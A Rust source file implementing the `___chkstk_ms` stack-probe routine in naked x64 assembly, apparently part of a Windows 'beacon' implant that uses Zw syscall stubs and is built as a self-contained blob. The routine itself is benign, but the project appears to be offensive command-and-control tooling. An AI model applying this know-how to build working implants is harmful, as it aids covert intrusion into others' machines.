//! Stack probe (`___chkstk_ms`): the beacon owns its ABI glue.
//!
//! Frames larger than one page (the Zw stub scratch buffer is 4 KiB) make
//! rustc emit a call to `___chkstk_ms` — normally provided by
//! compiler_builtins. But a single reference into compiler_builtins drags
//! its whole LTO-fused object (~50 KiB of mem/int/libm float code) into the
//! blob, because the archive members cannot be dead-stripped at function
//! granularity after the fat LTO merge. Defining the symbol here keeps the
//! beacon entirely free of builtins — every byte of the blob is ours, like
//! the original C.
//!
//! ABI (GCC/mingw `__chkstk_ms`): RAX holds the frame size on entry; the
//! function probes every page between RSP and RSP-size (a probe touches the
//! guard page so the kernel grows the stack before the caller subtracts),
//! preserves RAX (size) and all registers except flags, and returns.

use core::arch::naked_asm;

/// Probe loop, page by page (x64 page = 0x1000). MSVC contract: RAX holds
/// the frame size on entry and MUST come back unchanged (the caller does
/// `sub rsp, rax` with the full size and addresses the frame from the
/// original offsets). The walk counter lives in R10.
///
/// The iteration-15 bug this replaced: an unbalanced epilogue (`push rcx`
/// then `pop rax; pop rcx`) made the final `ret` pop a caller stack value
/// instead of the return address — every frame over one page returned into
/// garbage, which is what killed the real-Windows beacon from its first
/// instruction on a large frame.
///
/// # Safety
///
/// Naked function: the whole body is assembly; never call from Rust.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn ___chkstk_ms() {
    naked_asm!(
        "push rcx",
        "push r10",
        "mov r10, rax",
        "lea rcx, [rsp + 24]", // above the return address and both pushes
        "cmp r10, 0x1000",
        "jb 1f", // smaller than a page: single probe below
        "2:",
        "sub rcx, 0x1000",
        "test qword ptr [rcx], rcx", // touch the page (grows the stack)
        "sub r10, 0x1000",
        "cmp r10, 0x1000",
        "ja 2b", // keep probing while > 1 page remains
        "1:",
        "sub rcx, r10",
        "test qword ptr [rcx], rcx", // final probe at the exact bottom
        "pop r10",
        "pop rcx",
        "ret", // RAX = frame size, untouched
    );
}
